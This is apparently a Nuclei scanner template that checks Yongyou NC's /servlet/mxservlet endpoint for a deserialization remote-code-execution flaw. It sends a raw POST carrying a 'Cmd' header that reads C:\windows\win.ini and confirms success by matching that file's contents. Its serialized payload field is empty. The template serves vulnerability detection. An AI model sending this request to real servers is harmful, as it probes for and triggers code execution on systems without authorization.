id: poc-yaml-yongyou-nc-servlet-mxservlet-rce
info:
  name: Yongyou NC servlet_mxservlet RCE
  author: ProjectDiscoveryAI
  severity: critical
  tags: deserialization,rce
  description: |
    This template checks for a deserialization vulnerability in Yongyou NC servlet_mxservlet which can lead to remote code execution.
http:
  - raw:
      - |
        POST /servlet/mxservlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Cmd: type C:\\windows\\win.ini
        Content-Type: application/octet-stream

        {{hex_decode('')}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[files]"
          - "[fonts]"
          - "for 16-bit app support"
